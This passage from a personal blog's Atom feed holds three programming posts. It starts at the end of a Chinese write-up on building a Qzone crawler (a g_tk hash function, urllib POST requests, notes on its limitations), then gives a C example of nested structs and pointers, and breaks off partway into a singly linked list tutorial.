class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;skey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2147483647&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;简单分析一下，用python来重写了g_tk的计算函数（这种操作会因为腾×更新算法而失效，而腾×的更新恰好是比较快的2333&lt;/p&gt;

&lt;h3 id=&quot;urllib发送post请求&quot;&gt;urllib发送post请求&lt;/h3&gt;

&lt;p&gt;没啥好说的，构造post请求头，主体，发送请求&lt;/p&gt;

&lt;p&gt;源码地址：https://github.com/void0red/code/blob/master/qzone.py&lt;/p&gt;

&lt;h2 id=&quot;0x03后记&quot;&gt;0x03后记&lt;/h2&gt;

&lt;p&gt;&lt;del&gt;最滑稽的是，这个爬虫并没有实现，运行结果是Bad Request，233333&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;已经解决，问题在于没有计算请求头中Content-Length的值（笑&lt;/p&gt;

&lt;p&gt;总的来说，程序可用性不高：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;登录是用selenium实现的，加载会占用大量内存与cpu，不适宜在小型设备（例如树莓派）上运行&lt;/li&gt;
  &lt;li&gt;两个加密函数有时效性，qzonetoken还好，g_tk的计算就显得有些鸡肋，一旦腾×更改其中的某段代码中的某个参数值，该爬虫就得重新编写（事实上他也是这么做的，可以考虑用正则把js扣出来，放在本地运行，这样程序大概能健壮一些&lt;/li&gt;
  &lt;li&gt;程序容错率不高，一旦有环节出错，整个过程无法实现&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;del&gt;可喜的是，终于成功爬了qzone，2333&lt;/del&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;void0red 2017.10.13&lt;/p&gt;
&lt;/blockquote&gt;
</content>
<category term="others" />
<summary>  一次爬虫的记录与分享</summary>
</entry>
<entry>
<title>About learning c struct</title>
<link href="http://localhost:4000/2017/10/07/struct.html" rel="alternate" type="text/html" title="About learning c struct" />
<published>2017-10-07T00:00:00+08:00</published>
<updated>2017-10-07T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/10/07/struct</id>
<content type="html" xml:base="http://localhost:4000/2017/10/07/struct.html">&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;third&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;


&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;third&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;233&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;huaji&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}},&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;huaihuai&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2333&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;third&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</content>
<category term="c" />
<summary>```c#include struct first{	char name[10];};struct second{	struct first a;	int x;};struct third{	struct second b;	struct first c;	char y[5];};</summary>
</entry>
<entry>
<title>About learning linked_list</title>
<link href="http://localhost:4000/2017/10/07/linked_list.html" rel="alternate" type="text/html" title="About learning linked_list" />
<published>2017-10-07T00:00:00+08:00</published>
<updated>2017-10-07T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/10/07/linked_list</id>
<content type="html" xml:base="http://localhost:4000/2017/10/07/linked_list.html">&lt;blockquote&gt;
  &lt;p&gt;some Pointer and Struct practicing&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;链表由两部分组成，一部分是指针区，一部分是数据区，这里要说的是单链表，指针区仅仅只是下一个节点的地址，为了简化程序，数据区也只设置一个整型变量&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//初始化头节点
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//在链表末尾添加节点，返回节点指针
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node_add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//打印链表所有节点
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;node(%d):%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//在指定节点末尾插入新的节点（头节点为0号），返回节点指针
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node_insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newnode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
